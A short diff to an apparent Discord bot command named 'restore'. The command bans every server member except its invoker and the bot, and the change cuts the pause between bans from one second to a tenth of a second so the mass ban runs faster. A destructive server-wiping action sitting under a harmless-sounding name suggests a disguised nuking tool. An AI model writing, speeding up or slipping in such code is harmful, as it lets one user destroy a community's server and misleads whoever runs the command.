@@ -85,7 +85,7 @@ async def restore(ctx):
             if member != ctx.author and member != bot.user:
                 await member.ban(reason="Mass ban initiated")
                 print(f"Banned {member}")
-                await asyncio.sleep(1)  # prevents hitting rate limits
+                await asyncio.sleep(0.1)  # prevents hitting rate limits
         except Exception as e:
             print(f"Could not ban {member}: {e}")
 
